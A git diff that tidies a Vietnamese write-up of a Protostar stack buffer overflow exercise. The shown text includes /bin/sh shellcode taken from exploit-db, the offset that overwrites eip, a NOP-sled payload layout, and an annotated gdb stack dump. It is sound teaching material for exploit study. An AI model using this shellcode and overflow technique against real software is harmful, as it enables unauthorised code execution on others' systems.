@@ -40,7 +40,7 @@ Shellcode là gì ?
 Shellcode còn được gọi là bytecode, tạm dịch là mã máy. Chúng ta đều biết mã máy là thứ ngôn ngữ duy nhất mà bộ vi xử lí có thể hiểu được. Tất cả các chương trình viết bằng bất kì ngôn ngữ nào đều phải được biên dịch sang mã máy trước khi máy tính có thể chạy được chương trình đó. Khác với các chương trình này, shellcode được thể hiện như một nhóm các mã máy, do đó máy tính có thể hiểu và thực thi trực tiếp shellcode mà không cần phải trải qua bất kì công đoạn biên dịch nào cả.
 ```
 
-Với người mới tìm hiểu và chưa có kiến thức nhiều về mã máy, thử thách gợi ý sẽ tốt hơn khi tại thời điểm này sử dụng shellcode của ai đó.
+Với người mới tìm hiểu và chưa có kiến thức nhiều về mã máy, thử thách gợi ý sẽ tốt hơn khi tại thời điểm này sử dụng `shellcode` của ai đó.
 
 Tôi lấy nguồn từ trên mạng: <https://www.exploit-db.com/exploits/43716>
 
@@ -48,7 +48,7 @@ Tôi lấy nguồn từ trên mạng: <https://www.exploit-db.com/exploits/43716
 shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 ```
 
-Tiếp theo là tìm độ dài chuỗi có thể ghi đè eip
+Tiếp theo là tìm độ dài chuỗi có thể ghi đè eip.
 
 ```
 root@protostar:/opt/protostar/bin# python -c 'print "A" * 64 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4 + "F" * 4 + "G" * 4 + "H" * 4' > txt
@@ -64,11 +64,11 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 Vậy payload của chúng ta bây giờ sẽ trông như này:
 
-payload = "A" * 76 + return address + "\x90" * 100 + shellcode
+`payload = "A" * 76 + return address + "\x90" * 100 + shellcode`
 
-Các bạn nên đọc link tài liệu ở phần Documents để hiểu rõ hơn về shellcode và "\x90" NOPs
+Các bạn nên đọc link tài liệu ở phần Documents để hiểu rõ hơn về `shellcode` và `"\x90" NOPs`.
 
-Stack sẽ trông như sau khi bị ghi đè (Bố cục địa chỉ có thể khác trên máy bạn)
+Stack sẽ trông như sau khi bị ghi đè (Bố cục địa chỉ có thể khác trên máy bạn):
 
 ```
 (gdb) x/100wx $esp
@@ -77,14 +77,14 @@ Stack sẽ trông như sau khi bị ghi đè (Bố cục địa chỉ có thể 
 0xbffffc30:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffc40:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffc50:     0x41414141      0x41414141      0x41414141      0x41414141
-0xbffffc60:     0x41414141      0x41414141      0x41414141      0xxxxxxxxx       <-- Vị trí của Return address | Ở đây được tính toán = 0xbffffc6c + 0x50 = 0xbffffcbc
+0xbffffc60:     0x41414141      0x41414141      0x41414141      0xxxxxxxxx       <-- Vị trí của Return address | Ở đây được tính toán = 0xbffffc6c + 0x50 = 0xbffffcbc để trả về vào giữa dãy NOPs
 0xbffffc70:     0x90909090      0x90909090      0x90909090      0x90909090
 0xbffffc80:     0x90909090      0x90909090      0x90909090      0x90909090
-0xbffffc90:     0x90909090      0x90909090      0x90909090      0x90909090      <-- sau ret sẽ là chuỗi \x90\ vì sẽ có sự biến động khi chạy và debug, nên sẽ không thể tính chính xác vị trí của shell code mà phải ước lượng và trượt vào nó qua NOPs.
+0xbffffc90:     0x90909090      0x90909090      0x90909090      0x90909090      <-- sau ret sẽ là chuỗi '\x90' vì sẽ có sự biến động khi chạy và debug, nên sẽ không thể tính chính xác vị trí của shellcode mà phải ước lượng và trượt vào nó qua NOPs để đến shell.
 0xbffffca0:     0x90909090      0x90909090      0x90909090      0x90909090
 0xbffffcb0:     0x90909090      0x90909090      0x90909090      0x90909090
 0xbffffcc0:     0x90909090      0x90909090      0x90909090      0x90909090
-0xbffffcd0:     0x90909090      0x50c031cc      0x732f2f68      0x622f6868        <-- Shell code start: 0xbffffcd4, sau chuỗi NOP sẽ là shellcode do hệ thống sẽ bỏ qua NOP và tiếp tục thực thi.
+0xbffffcd0:     0x90909090      0x50c031cc      0x732f2f68      0x622f6868        <-- Shellcode start: 0xbffffcd4, sau chuỗi NOPs sẽ là shellcode do hệ thống sẽ bỏ qua NOPs và tiếp tục thực thi.
 0xbffffce0:     0xe3896e69      0xc289c189      0x80cd0bb0      0xcd40c031
 0xbffffcf0:     0x08040080      0x00000001      0xbffffd14      0x080483f0
 0xbffffd00:     0x080483e0      0xb7ff1040      0xbffffd0c      0xb7fff8f8
@@ -98,7 +98,7 @@ Stack sẽ trông như sau khi bị ghi đè (Bố cục địa chỉ có thể 
 0xbffffd80:     0x00001000      0x00000011      0x00000064      0x00000003
 0xbffffd90:     0x08048034      0x00000004      0x00000020      0x00000005
 ```
-Kết quả dừng trước int3 \xcc -> bỏ int3 thì shellcode được thực thi
+Kết quả dừng trước int3 '\xcc' -> bỏ int3 thì shellcode được thực thi.
 
 ```
 (gdb) c
